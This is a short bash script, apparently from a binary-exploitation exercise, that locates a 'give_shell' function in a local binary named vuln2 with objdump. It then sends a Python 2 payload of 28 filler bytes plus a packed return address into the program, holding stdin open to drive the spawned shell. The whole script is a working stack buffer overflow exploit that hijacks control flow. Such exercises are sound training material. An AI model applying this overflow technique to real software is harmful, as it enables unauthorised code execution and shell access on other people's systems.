#!/bin/bash

echo "objdump -d vuln2 | grep give_shell"
objdump -d vuln2 | grep give_shell
echo "(python2 -c 'import struct; print "A" * 28 + struct.pack("I", 0x080484cb)'; cat -) | ./vuln2"
(python2 -c 'import struct; print "A" * 28 + struct.pack("I", 0x080484cb)'; cat -) | ./vuln2
